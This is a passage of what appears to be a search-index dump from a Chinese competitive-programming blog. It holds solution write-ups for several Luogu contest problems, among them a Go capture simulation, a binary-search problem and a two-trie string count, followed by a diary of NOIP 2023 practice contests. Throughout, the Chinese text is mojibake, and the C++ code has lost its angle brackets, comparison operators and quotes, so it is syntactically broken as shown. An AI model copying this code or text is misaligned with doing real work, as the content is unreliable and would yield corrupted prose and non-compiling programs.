(xx,yy) == id.end ()) continue;//ä¸éœ€è¦æ”¾ç½®ç‚¸å¼¹ int o = id[xx,yy]; tmp[k - o - 1] = min (v[o],tmp[k - o - 1] + 1);//ç‚¸å¼¹æœ€å¤šä¸è¶…è¿‡æ ¼å­ä¸­é±¼çš„æ•°é‡ æ³¨æ„ä¸‹æ ‡ p = 0; for (int i = tmp.size () - 1;~i;--i) p = p * 4 + tmp[i];//é‡æ–°è®¡ç®—å‡ºæ–°çš„çŠ¶æ€ dp[p] = min (dp[p],dp[i] + 1); printf (%d ,dp[tot]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP10864 [HBCPC2024] Genshin Impact Startup Forbidden II","path":"/2024/08/11/P10864/","content":"ã€é¢˜ç›®å¤§æ„ã€‘ æ¨¡æ‹Ÿå›´æ£‹çš„è½å­è¿‡ç¨‹ï¼Œç„¶åæ ¹æ®å›´æ£‹çš„æ°”æ¥è®¡ç®—æ¯ä¸€æ­¥è½å­åè¢«æå­çš„ä¸ªæ•°ã€‚ å½“ç„¶å¼ºè°ƒäº†ï¼Œæ¯ä¸€æ­¥çš„è½å­æ²¡æœ‰é™åˆ¶ï¼Œä¹Ÿå°±æœ‰å¯èƒ½æŸä¸ªæ£‹å­åˆšè½ä¸‹å»åä¼šç›´æ¥è¢«ææ‰ã€‚ ã€æ€è·¯ã€‘ ç›´æ¥åœ¨è½å­åæš´åŠ›æœç´¢è®¡ç®—å‡ºç›¸é‚»çš„æ£‹å­æ‰€åœ¨å—çš„æ°”ï¼Œæœ€ååœ¨è®¡ç®—è½å­ä½ç½®æ‰€åœ¨å—çš„æ°”ã€‚ å…·ä½“æ¥è¯´ï¼Œå¯¹äºä» $(x,y)$ å¼€å§‹æœç´¢çš„æ£‹å­ï¼Œæ¯åˆ°è¾¾ä¸€ä¸ªæœªè¢«è®¿é—®åˆ°çš„åŒè‰²æ£‹å­çš„å—ï¼Œå°±åŠ å…¥åˆ°é›†åˆä¸­ï¼›æ¯åˆ°è¾¾ä¸€ä¸ªæœªè¢«è®¿é—®åˆ°çš„ç©ºä½ï¼Œå°±æŠŠè¯¥è¿é€šå—çš„æ°”çš„æ•°ç›®åŠ ä¸€ã€‚ ç”±äºæ—¶é™ä¸º $4s$ï¼Œå¹¶ä¸”æ£‹ç›˜çš„å¤§å°æ˜¯ $19 \\times 19$ çš„ï¼Œæ‰€ä»¥å¤æ‚åº¦ä¸º $O(m)$ï¼Œå¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ ã€ä»£ç ã€‘ #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#define init(x) memset (x,-1,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();vector pair int,int v;int t,outa,outb,cnt;int a[25][25],vis[25][25],sx[] = 0,0,1,-1,sy[] = 1,-1,0,0; void search (int x,int y,int col);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read ();init (a); for (int i = 1;i = t;++i) int x = read (),y = read (),ty = (i 1) ? 0 : 1;//ty = 1 ä¸ºç™½æ£‹ a[x][y] = ty;outa = outb = 0;//å…ˆå¤„ç†å¯¹æ‰‹çš„æ°”çš„æƒ…å†µï¼Œæå®Œå­åå†å¤„ç†è‡ªå·±çš„æ°” for (int i = 0;i 4;++i)//å¤„ç†è¿™ä¸ªæ£‹å­çš„ç›¸é‚»ä½ç½® int xx = x + sx[i],yy = y + sy[i]; cnt = 0;v.clear (); if (1 = xx xx = 19 1 = yy yy = 19) if (a[xx][yy] == (ty ^ 1) !vis[xx][yy]) search (xx,yy,ty ^ 1); if (!cnt)//æ²¡æœ‰æ°”ä¼šè¢«æå­ if (ty == 0) outb += v.size (); else outa += v.size ();//æå­çš„æ•°ç›®å³ä¸º v çš„å¤§å° for (auto p : v) a[p.first][p.second] = -1;//æ¸…ç©ºè¿™äº›ä½ç½® cnt = 0;v.clear (); search (x,y,ty); if (!cnt) if (ty == 0) outa += v.size (); else outb += v.size (); for (auto p : v) a[p.first][p.second] = -1; for (int i = 1;i = 19;++i) for (int j = 1;j = 19;++j) vis[i][j] = 0; printf (%d %d ,outa,outb); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void search (int x,int y,int col) vis[x][y] = 1;v.push_back (x,y);//æ ‡è®° for (int i = 0;i 4;++i) int xx = x + sx[i],yy = y + sy[i]; if (1 = xx xx = 19 1 = yy yy = 19) if (a[xx][yy] == -1) ++cnt;//ç©ºä½ if (a[xx][yy] == col !vis[xx][yy]) search (xx,yy,col);","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP10701 [SNCPC2024] è‡´å‘½å…¬å¸","path":"/2024/07/06/P10701/","content":"çœ‹å®Œé¢˜ç›®åç›²çŒœäºŒåˆ†ç­”æ¡ˆï¼ˆï¼‰ã€‚ é¢˜ç›®çš„éš¾ç‚¹æ˜¾ç„¶æ˜¯å¦‚ä½•åˆ†é…å‡è§†çš„æ—¶é—´äºä¸åŒçš„é€šé“ï¼Œä»¥åŠå¦‚ä½•åœ¨ä¸€æ¬¡å‡è§†æ—¶å°†é€šé“å†…çš„å­å¼¹è¿›è¡Œæ ‡è®°ã€‚ äºŒåˆ†æ—¶åˆ» $t$ï¼Œå¯¹äºæ‰€æœ‰çš„å­å¼¹ï¼Œæœ‰ä»¥ä¸‹æƒ…å†µï¼š åœ¨ $t$ æ—¶åˆ»ï¼Œè¯¥å­å¼¹ä»æœªå‡ºç°ï¼Œå¿½ç•¥è¯¥å­å¼¹ã€‚ ä»å­å¼¹å‡ºç°åˆ° $t$ æ—¶åˆ»ï¼Œä¸éœ€è¦é¢å¤–å†ä½¿ç”¨å‡è§†ï¼Œå¿½ç•¥è¯¥å­å¼¹ã€‚ ä»å­å¼¹å‡ºç°åˆ° $t$ æ—¶åˆ»ï¼Œéœ€è¦é¢å¤–ä½¿ç”¨å‡è§†ï¼Œè®¡ç®—å¹¶æ ‡è®°ã€‚å½“ç„¶ï¼Œéœ€è¦å…ˆåˆ¤æ–­æ‰€å‰©çš„æ—¶é—´èƒ½å¦æ»¡è¶³æ¡ä»¶ã€‚ é‚£ä¹ˆå¯¹äºç¬¬ä¸€ä¸ªéš¾ç‚¹ï¼Œå¯ä»¥å¯¹å­å¼¹å‡ºç°çš„æ—¶é—´è¿›è¡Œæ’åºï¼Œä¸ºäº†ä½¿å¾—å‡è§†ä¸ä¼šäº§ç”Ÿåæ•ˆæ€§ï¼Œæˆ‘ä»¬æŒ‰ç…§æ—¶é—´è¿›è¡Œé™åºï¼Œä¾æ¬¡è€ƒè™‘å­å¼¹æ‰€åœ¨é€šé“æ‰€éœ€çš„å‡è§†æ—¶é—´ã€‚å¯¹äºç¬¬äºŒä¸ªéš¾ç‚¹ï¼Œåªéœ€å†ç”¨ä¸€ä¸ªæ•°ç»„è®°å½•é€šé“å·²ç”¨çš„å‡è§†çš„æ—¶é—´å³å¯ã€‚ ç‰¹åˆ«åœ°ï¼Œå½“æ‰€æœ‰å­å¼¹éƒ½åœ¨åŒä¸€ä¸ªé€šé“æ—¶ï¼Œæ°¸è¿œéƒ½ä¸ä¼šå—åˆ°ä¼¤å®³ï¼Œç‰¹åˆ¤å³å¯ã€‚ æœ€åæ—¶é—´å¤æ‚åº¦ $O(n \\log n)$ã€‚æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline ll read ();struct node ll t,x,y; s[MAX];ll tot,n,m,k,l = 0,r = INF,ans,ex[MAX],st[MAX]; bool cmp (node xx,node yy);ll check (ll ti);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read (); for (int i = 1;i = m;++i) s[i].t = read ();s[i].x = read ();s[i].y = read (); if (!ex[s[i].x]) ex[s[i].x] = 1,++tot; sort (s + 1,s + 1 + m,cmp);//æŒ‰ç…§æ—¶é—´é™åºæ’åº if (tot == 1) puts (-1);return 0;//ç‰¹åˆ¤ while (l = r) ll mid = (l + r) 1; if (check (mid)) ans = mid,l = mid + 1; else r = mid - 1; printf (%lld ,ans); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (node xx,node yy) return (xx.t == yy.t) ? xx.y yy.y : xx.t yy.t;//æ—¶é—´æ™šçš„ä¼˜å…ˆ ll check (ll ti) ll ret = ti;//ä» ti å¼€å§‹æ¶ˆè€—ç”¨äºå‡è§† for (int i = 1;i = n;++i) st[i] = 0;//æ¯ä¸ªé€šé“è¢«å‡è§†çš„æ¬¡æ•° for (int i = 1;i = m;++i) if (ti s[i].t) continue;//è¯¥å­å¼¹è¿˜æœªå‡ºç° ll tmp = (s[i].y - 1) / k + 1 + st[s[i].x] + s[i].t - 1;//åˆ°è¾¾æ—¶çš„æ—¶é—´ if (tmp ti) continue;//å­å¼¹åœ¨ ti æ—¶æ— æ³•è¾¾åˆ° tmp = ti - tmp + 1;//éœ€è¦å‡è§†çš„æ—¶é—´ if (ret - tmp + 1 s[i].t) return 0;//å‰©ä½™æ—¶é—´æ— æ³•å¤„ç† ret -= tmp;st[s[i].x] += tmp;//è¿›è¡Œæ ‡è®° return 1;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP9778 [HUSTFC 2023] åŸºå› ç¼–è¾‘","path":"/2024/06/20/P9778/","content":"å°†é¢˜æ„è¿›è¡Œç®€å•çš„è½¬æ¢ï¼Œæšä¸¾ $S_k$ï¼Œç„¶åå†æšä¸¾å…¶ä¸­çš„æ–­ç‚¹ $i$ï¼Œå°†å…¶åˆ†ä¸º $S_k[:i]$ å’Œ $S_k[i + 1:]$ã€‚å› æ­¤åªéœ€è¦æ±‚å‡ºå‰ç¼€ä¸º $S_k[:i]$ å’Œ $S_k[i + 1:]$ çš„ä¹˜ç§¯ï¼Œä¸éš¾æƒ³åˆ°å¯¹å‰ç¼€å’Œåç¼€åˆ†åˆ«å»ºç«‹ $\\texttt{Trie}$ æ ‘ã€‚ ä½†æ˜¯é—®é¢˜å¹¶æ²¡æœ‰å®Œå…¨è§£å†³ï¼Œæ‰‹æ¨¡ç¬¬ä¸€ä¸ªæ ·ä¾‹å‘ç°ï¼Œ$\\texttt{A + AA}$ å’Œ $\\texttt{AA + A}$ å‡å¯ä»¥å¾—åˆ° $\\texttt{AAA}$ï¼Œä¹Ÿå°±æ˜¯è¯´ç›®å‰ç®—æ³•å­˜åœ¨é‡å¤è®¡ç®—ã€‚è€ƒè™‘ä¸€ä¸ªè´ªå¿ƒçš„æ€æƒ³ï¼Œè‹¥ä¸€ä¸ªè¾ƒé•¿çš„å­ä¸²ä¸­å­˜åœ¨æ‰€éœ€ä¸²ï¼Œåˆ™åªå°†æ ‡è®°æ‰“åœ¨è¾ƒé•¿ä¸²ä¸Šè€Œä¸æ˜¯å…¶ä¸­çš„è¾ƒçŸ­çš„æ‰€éœ€ä¸²ï¼Œæ˜¾ç„¶è¿™æ ·æ ‡è®°ä¸¥æ ¼è¦†ç›–çš„ã€‚é‚£ä¹ˆï¼Œç»“åˆå·®åˆ†çš„æ€æƒ³ï¼Œè®¾ $f_{i,j}$ è¡¨ç¤ºä»¥ $S_i[:j]$ ä¸ºå‰ç¼€çš„ä¸ªæ•°ï¼Œåˆ™ $f_{i,j} - f_{i,j + 1}$ å¾—åˆ°çš„ä¸€å®šæ˜¯ä¸¥æ ¼ä»¥ $S_i[:j]$ ä¸ºå‰ç¼€çš„ä¸ªæ•°ã€‚åœ¨ç»Ÿè®¡ç­”æ¡ˆçš„æ—¶å€™ï¼Œä»é•¿çš„ä¸²åˆ°çŸ­çš„ä¸²è¿›è¡Œç´¯ç§¯å³å¯ã€‚ æ—¶é—´å¤æ‚åº¦ $O(\\sum |S_i|)$ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e6 + 5;const int MOD = 1e9 + 7;inline int read ();map char,int mp;int n,pre_cnt = 1,sub_cnt = 1,len[MAX],pre_ch[MAX][5],sub_ch[MAX][5],pre_tot[MAX],sub_tot[MAX];vector ll pre_ans[MAX],sub_ans[MAX];vector char s[MAX]; char str[MAX];ll ans;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); mp[A] = 1;mp[G] = 2;mp[C] = 3;mp[T] = 4; n = read (); for (int i = 1;i = n;++i) scanf (%s,str); len[i] = strlen (str); int u = 1; for (int j = 0;j len[i];++j)//two Tries s[i].push_back (str[j]); int c = mp[s[i][j]]; if (!pre_ch[u][c]) pre_ch[u][c] = ++pre_cnt; u = pre_ch[u][c]; ++pre_tot[u]; u = 1; for (int j = len[i] - 1;~j;--j) int c = mp[s[i][j]]; if (!sub_ch[u][c]) sub_ch[u][c] = ++sub_cnt; u = sub_ch[u][c]; ++sub_tot[u]; for (int i = 1;i = n;++i) int u = 1,sum;pre_ans[i].push_back (n - 1); for (int j = 0;j len[i];++j) int c = mp[s[i][j]]; u = pre_ch[u][c]; pre_ans[i].push_back (pre_tot[u] - 1);//the empty situation if (!u) break; for (int j = 1;j = len[i];++j) pre_ans[i][j - 1] -= pre_ans[i][j]; // subtraction gives a precise value u = 1;sub_ans[i].push_back (n - 1); for (int j = len[i] - 1;~j;--j) int c = mp[s[i][j]]; u = sub_ch[u][c]; sub_ans[i].push_back (sub_tot[u] - 1); if (!u) break; for (int j = 1;j = len[i];++j) sub_ans[i][j - 1] -= sub_ans[i][j]; for (int i = 1;i = n;++i) ll sum = 0; for (int j = 0;j = len[i];++j) sum += sub_ans[i][len[i] - j],ans += sum * pre_ans[i][j]; // Equivalently,for j in range from len[i] to 0 is workable,but sum should be sub_pre printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"NOIP 2023 æ‘†çƒ‚è®°","path":"/2023/09/29/NOIP2023/","content":"å‰è¨€å·²ç»é«˜ä¸‰äº†ï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³ç©ä¸€ä¸‹ï¼ŒæŠ½ç©ºå†™ç‚¹é¢˜ç›®ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹ã€‚ ã€å‰æƒ…æè¦ï¼šæœ¬æ–‡çš„æ’°å†™å…·æœ‰æ»åæ€§ï¼Œå› æ­¤æµå¤±äº†å¤§é‡ç»†èŠ‚ã€‚ã€‘ $2023.9.16$åˆèµ›ï¼Œå®Œå–„ç¨‹åºåšå¾—ç¨€çƒ‚ï¼Œå¥½åœ¨ $60+$ è¿˜æ˜¯è¿‡çº¿äº†ã€‚çœŸä¸æ•¢ç›¸ä¿¡ä»Šå¹´æµ™æ±Ÿçº¿ä¼šè¿™ä¹ˆä½ï¼Œåªæœ‰ $50.5 \\rm{pts}$ã€‚ $2023.9.29$å‘ƒï¼Œé«˜ä¸‰ç‰²çš„å›½åº†åªæœ‰ $3$ å¤©ã€‚é—®è€å¸ˆè¦äº†é¢˜ç›®ï¼Œæ‰“é•¿ä¹çš„æ¨¡æ‹Ÿèµ›ã€‚ $\\texttt{T1}$ ä¸€çœ‹ $10^9$ çš„æ•°æ®èŒƒå›´åŠ  $10^6$ çš„è¯¢é—®å°±çŒœæµ‹æ˜¯æ¨å‡ºå¼å­åŠ ä¸ŠçŸ©é˜µå¿«é€Ÿå¹‚ä¼˜åŒ–ã€‚æ‰‹ç©å°æ•°æ®æ¨äº†åŠå¤©ï¼Œè¿˜å¾ˆä¸è¦è„¸çš„ç”¨äº†ä¸€ä¸‹ $\\texttt{OEIS}$ï¼Œå‘ç° $f_n = f_{n - 1} + f_{n - 3} + 1$ï¼Œæ‰€ä»¥å°±æœ‰äº†ä¸€ä¸ª $4 \\times 4$ çš„çŸ©é˜µï¼š \\left[ \\begin{array}{ccc}f[n]\\\\f[n - 1]\\\\f[n - 2]\\\\1 \\end{array} \\right] = \\left[ \\begin{array}{ccc}1\\ 0 \\ 1 \\ 1 \\\\ 1 \\ 0 \\ 0 \\ 0 \\\\ 0 \\ 1 \\ 0 \\ 0 \\\\ 0 \\ 0 \\ 0 \\ 1 \\end{array} \\right] ^ {n - 3} \\times \\left[ \\begin{array}{ccc}f[n - 1]\\\\f[n - 2]\\\\f[n - 3]\\\\1 \\end{array} \\right]ç®—äº†ä¸€ä¸‹æ—¶é—´å¤æ‚åº¦æ˜¯ $O(T \\times 4^3 \\times \\log n)$ï¼Œå¥½åƒæ•°æ®æœ‰ç‚¹å¤§ï¼Œå¯èƒ½ä¼šè¢«å¡å¸¸ï¼Œä½†æ˜¯æ²¡ç®¡äº†å…ˆåšåé¢çš„ã€‚ $\\texttt{T2}$ ä¼¼ä¹æ˜¯ä¸ªç®€å•é¢˜ï¼Œå°±æ˜¯æ±‚ $A$ ä¸­æœ‰å¤šå°‘æ®µå’Œ $B$ çš„é•¿åº¦ç›¸åŒä¸”å« $1$ çš„ä¸ªæ•°ç›¸åŒã€‚ç”±äºé¢˜ç›®é™åˆ¶äº†è¯¢é—®ä¸²çš„æ€»é•¿ï¼Œæ‰€ä»¥å……åˆ†åˆ©ç”¨å¥½æ ¹å·è¿™ä¸€åˆ†ç•Œçº¿ï¼Œå°äºçš„ç”¨è®°å¿†åŒ–çš„æ–¹å¼å»ç®—ï¼Œå¤§çš„ç›´æ¥æš´åŠ›ï¼Œæ—¶é—´å¤æ‚åº¦ $O(n \\sqrt{L})$ã€‚ $\\texttt{T3}$ æŸ“è‰²ï¼Œå¤§æ¦‚æ˜¯è¦ $\\texttt{dp}$ï¼Œä½†æ˜¯ä¼¼ä¹ä¸ä¼šã€‚å†™äº†ä¸€ä¸ªæš´åŠ›å¤–åŠ é¢œè‰²å‡ç›¸åŒçš„è¿™ä¸€æ¡£çš„é€’æ¨ã€‚ $\\texttt{T4}$ å°† $n$ ä¸ªæ•°å‡åˆ†åˆ° $k$ ä¸ªé›†åˆä¸­ï¼Œä¿è¯æ¯ä¸ªé›†åˆä¸­å…ƒç´ äº’å¼‚ã€‚è®¾ç¬¬ $i$ ä¸ªé›†åˆä¸­çš„æå·®ä¸º $s_i$ï¼Œæ±‚ $\\min (\\sum_{i = 1}^{k} s_i)$ã€‚è¿™ä¸ªæš´åŠ›çœ‹ä¸Šå»ä¹Ÿå¾ˆéš¾æ‰“ï¼Œæ‰€ä»¥é™·å…¥æ²‰æ€ã€‚å°±åœ¨æˆ‘ä¸€ç›´ç›¯ç€ $n \\le 70$ çš„æ•°æ®èŒƒå›´ä¸Šæ—¶ï¼Œçªç„¶æƒ³åˆ°äº†ä¸€ç§ä¹±æåšæ³•ï¼šå°±æ˜¯æ¯æ¬¡æ‰“ä¹±è¿™ $n$ ä¸ªæ•°ï¼Œç„¶åæŒ‰é¡ºåºå¡å…¥ $k$ ä¸ªé›†åˆä¸­ï¼Œè‹¥æ‰€æœ‰é›†åˆåˆæ³•ï¼Œé‚£ä¹ˆæ›´æ–°ç­”æ¡ˆã€‚ä¸æ–­å¾ªç¯æœ€ååŠ ä¸Šä¸€ä¸ªå¡æ—¶å°±è¡Œã€‚è¯•äº†ä¸€ä¸‹èƒ½è¿‡æ ·ä¾‹ï¼ŒçœŸæ£’ï¼ é¢„è®¡å¾—åˆ†ï¼š$80 + 100 + 30 + ???$ï¼› å®é™…å¾—åˆ†ï¼š$60 + 100 + 20 + 60 = 240 \\texttt{pts}$ã€‚ éœ‡æƒŠï¼Œä¹±æåšæ³•ç«Ÿç„¶è·å¾—äº† $60$ çš„é«˜åˆ†ï¼Œè¿™æ˜¯å¥½çš„ã€‚ä½†æ˜¯ï¼Œ$\\texttt{T1}$ è¢«å¤šå¡äº† $20$ï¼Œä»¥åŠ $\\texttt{T3}$ å†™äº†å¥½é•¿çš„é€’æ¨çš„ $10 \\texttt{pts}$ å¥½åƒé”™äº†æ²¡æ‹¿åˆ°åˆ†æ•°ã€‚çœ‹äº†ä¸€ä¸‹æ’å $\\texttt{rk 4}$ è¿˜ä¸é”™ã€‚ çœ‹äº†é¢˜è§£ï¼Œç¬¬ä¸€é¢˜æ˜¯å¯¹ $4^3$ çš„çŸ©é˜µè½¬ç§»çš„ä¼˜åŒ–ï¼Œå€å¢é¢„å¤„ç†ç„¶ååœ¨è¯¢é—®é‡Œç”¨ $1 \\times 4$ å’Œ $4 \\times 4$ çš„çŸ©é˜µæ›´æ–°ã€‚åé¢ä¸¤é¢˜å˜›ï¼Œçœ‹äº†é¢˜è§£è¿˜æ˜¯å®ç°ä¸å‡ºæ¥ qwqã€‚ $2023.9.30$$\\texttt{T1}$ ç®€å•çš„æ¨¡æ‹Ÿï¼Œæœ¬æ¥æƒ³ç€çº¿æ®µæ ‘ä¼˜åŒ–æ±‚å’Œï¼Œä½†é©¬ä¸Šå‘ç°å·®åˆ†å°±è¡Œäº†ï¼ŒåŠå°æ—¶å†…å°±ç å®Œäº†è¿™é¢˜ã€‚å¥½åƒè¿˜æŠ¢åˆ°äº†ä¸€è¡€æ¥ç€ã€‚ $\\texttt{T2}$ ç«Ÿç„¶åšè¿‡ï¼Œæ˜¯ The Shortest Statementï¼Œæœ€çŸ­è·¯åŠ æœ€å°ç”Ÿæˆæ ‘çš„å¥½é¢˜ï¼ä½†æ˜¯æ•°æ®èŒƒå›´æœ‰äº›å·®å¼‚ï¼Œèµ›æ—¶è¿‡äºé«˜å…´çš„å¤åˆ¶äº†å½“æ—¶çš„ä»£ç ï¼Œæ²¡ä»”ç»†çœ‹ï¼Œæ‰€ä»¥æœ€åå› ä¸ºæ•°ç»„è¶Šç•Œ $100 \\to 40$ã€‚ $\\texttt{T3}$ åˆæ˜¯ä¸€é“è€ƒå¯Ÿå†’æ³¡æ’åºçš„æ·±åº¦ç†è§£çš„é¢˜ç›®ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æŒ‰ç…§å¥‡å¶ä½å¤„ç†ï¼Œä½†æ˜¯å‘ç°å¤æ‚åº¦æ€ä¹ˆæéƒ½æ˜¯ $O(nm \\log n)$ï¼Œæœ€åäº¤äº†æš´åŠ›ä¸Šå»ã€‚èµ›åè®¢æ­£å‘ç°é¢˜è§£çš„æ–¹æ³•å¾ˆå¦™ï¼Œç”¨æ¡¶è®°å½•æ•°å­—ï¼Œç„¶åå¥‡æ•° $+1$ï¼Œå¶æ•° $-1$ï¼Œè¿™æ ·å°±å¯è½¬æ¢ä¸ºæ•°æ®ç»“æ„ç»´æŠ¤æå€¼ã€‚ $\\texttt{T4}$ åŠ¨å½’ï¼Œè½¬ç§»æ–¹ç¨‹å¾ˆå¥½åˆ—ï¼š $dp_i = \\max \\{dp_{j|a_i \\ge a_j,0 \\le j \\le i - 1} - \\dfrac{(i - j)(i - j - 1)}{2}\\} + a_i$ï¼Œç­”æ¡ˆçš„æ›´æ–°æ˜¯ $ans = \\max \\left (ans,dp_i - \\dfrac{(n - i + 1)(n - i)}{2}\\right)$ã€‚ç„¶åä¸å¤ªä¼šæ–œç‡ä¼˜åŒ–ä»¥åŠä¸å¤ªä¼š $a_i \\ge a_j$ çš„å¤„ç†ï¼Œæ‰€ä»¥å°±å®ç°äº†ä¸€ä¸ª $O(n^2)$ çš„æœ´ç´  $\\texttt{dp}$ã€‚ç”±äºæˆ‘å¹¶æ²¡æœ‰å¤„ç†è´Ÿæ•°çš„æƒ…å†µï¼Œä½†æ˜¯å¥½åƒéƒ¨åˆ†åˆ†çš„æ•°æ®æœ‰è¯¯ï¼Œæ‰€ä»¥æˆ‘çˆ†çµäº†ã€‚ æœ€åå¾—åˆ†ï¼š$100 + 40 + 30 + 0 = 170$ï¼Œæ’å $\\texttt{rk 15}$ã€‚æœ¬æ¥åº”è¯¥æ˜¯ï¼š$100 + 100 + 30 + 20 = 250$ çš„å‘œå‘œå‘œâ€¦â€¦ $2023.10.01$$\\texttt{T1}$ ç¨ä½œåˆ†æå°±å‘ç°è¿™ä¸ªæ¦‚ç‡å¹¶æ²¡ä»€ä¹ˆå®é™…çš„ç”¨å¤„ï¼Œèƒ½åˆ°è¾¾ä¸æ ¹è·ç¦»ä¸º $k$ çš„ç»“ç‚¹çš„æœŸæœ›ä¸º $2^{-k}$ã€‚ç›´æ¥éå†æ‰€æœ‰çš„æ ¹æ±‚è§£ä¸º $O(n^2)$ï¼Œå®¹æ˜“æƒ³åˆ°æ¢æ ¹ $\\texttt{dp}$ï¼Œ$f_u = 2^{sz_u - 1} + \\sum_{v \\mid son_u} 2^{sz_u - sz_v - 1} f_v$ï¼Œæ—¶é—´å¤æ‚åº¦å°±å˜ä¸º $O(n)$ã€‚è‡ªå·±å®ç°çš„æ—¶å€™ç›´æ¥å¤„ç†äº† $2^{-k}$ ç®—æœŸæœ›ï¼Œå’Œæ ‡ç¨‹çš„è½¬ç§»æ–¹ç¨‹ç•¥æœ‰ä¸åŒã€‚ $\\texttt{T2}$ ç›´æ¥æ„é€ è‹¥å¹²ä¸ªå®Œå…¨å›¾ï¼Œä¸€ä¸ªå®Œå…¨å›¾çš„ä¸‰å…ƒç¯æ•°ä¸º $C_k^3 = \\dfrac {k(k - 1)(k - 2)}{6}$ã€‚å› æ­¤ä» $500$ å¼€å§‹å‘ $1$ å¼€å§‹éå†å³å¯ã€‚ç®€å•é¢˜ï¼Œå¹¶æ‹¿åˆ°äº†ä¸€è¡€ã€‚ $\\texttt{T3}$ èµ›æ—¶åœ¨è´ªå¿ƒè¿˜æ˜¯åŠ¨è§„ä¹‹é—´å¾˜å¾Šã€‚è¿˜æ˜¯åˆ†æä¸åˆ°ä½ï¼Œæœ€åæ‰“äº†ä¸ªæš´åŠ›äº¤ä¸Šå»ï¼Œä½†æ˜¯ $\\texttt{WA}$ äº†ã€‚ $\\texttt{T4}$ ä¸çŸ¥æ€çš„ï¼Œå†™äº†ä¸€ä¸ªæ¨¡æ‹Ÿï¼Œä¹Ÿ $\\texttt{WA}$ äº†ã€‚ æœ€åå¾—åˆ†ï¼š$100 + 100 + 0 + 0 = 200$ï¼Œæ’å $\\texttt{rk 10}$ã€‚ $2023.10.15$æ‰“æ´›è°·ä¸Šçš„æ¨¡æ‹Ÿèµ›ï¼Œæ‰“å¾—æœ‰ç‚¹åºŸï¼Œ$100 + 8 + 25 + 0 = 133$ã€‚ $\\texttt{T1}$ æƒ³çš„ $\\texttt{dp}$ ä¸€ç›´å‡ï¼Œç›´åˆ°æœºæˆ¿å¤§ä½¬çš„ç‚¹æ‹¨ä»¥åæ‰å‹‰å¼ºå†™å‡ºæ¥ã€‚åæ­£èŠ±è´¹äº†å¾ˆå¤šå¾ˆå¤šæ—¶é—´ã€‚èµ›åçœ‹é¢˜è§£ï¼Œå‘ç° $\\texttt{ST}$ è¡¨é¡µè¡Œï¼Œåæ­£èµ›æ—¶å•¥ä¹Ÿä¸è¡Œã€‚ $\\texttt{T2}$ æš´åŠ›ï¼Œç„¶åæ¶¦ã€‚èµ›åè¡¥é¢˜ï¼Œå…¶å®ä¹Ÿè›®å¥½æƒ³çš„ï¼Œå°±æ˜¯åŸºäºäºŒè¿›åˆ¶ä½çš„æ ‘ä¸Š $\\texttt{dp}$ï¼Œè®¾ $g[u][i][0/1]$ è¡¨ç¤ºä»¥ $u $ä¸ºæ ¹çš„å­æ ‘å†…ï¼Œæ‰€æœ‰æ–­è¾¹æ–¹æ¡ˆä¸­ä»·å€¼åœ¨äºŒè¿›åˆ¶ä¸‹ç¬¬ $i$ ä½ä¸º $0/1$ çš„ä¸ä¸ $u$ ç›¸è¿çš„è”é€šå—çš„ä»·å€¼ä¹˜ç§¯çš„å’Œ. $\\texttt{T3}$ æš´åŠ›å¤§åˆ†è®¨ï¼Œç„¶åæ¶¦ã€‚æ­£è§£æ˜¯åŒºé—´ $\\texttt{dp}$ï¼Œæ—¶é—´å¤æ‚åº¦ $O(Tn^3)$ï¼Œçœ‹é¢˜è§£å§ï¼Œæ€è·¯å°±ä¸å†™äº†ã€‚ $\\texttt{T4}$ æ²¡çœ‹ï¼Œç›´æ¥æ¶¦ã€‚ $2023.10.21$æ¯”èµ›æ—¥ï¼$\\texttt{rp++}$ï¼ $\\texttt{T1}$ æ°´é¢˜ï¼Œç›´æ¥æš´åŠ›æœç´¢ï¼Œç„¶åè¿‡å¤§æ ·ä¾‹ã€‚ $\\texttt{T2}$ å­—ç¬¦ä¸²æ¶ˆæ¶ˆä¹ï¼Œæƒ³äº†åŠå¤©åªä¼š $O(n^3)$ çš„åŒºé—´ $\\texttt{dp}$ï¼Œä¹‹åä¸€ç›´æ²¡æœ‰è¿›å±•ã€‚å®³ï¼Œå…¶å®å‡ºè€ƒåœºæ‰å‘ç° $O(n^2)$ 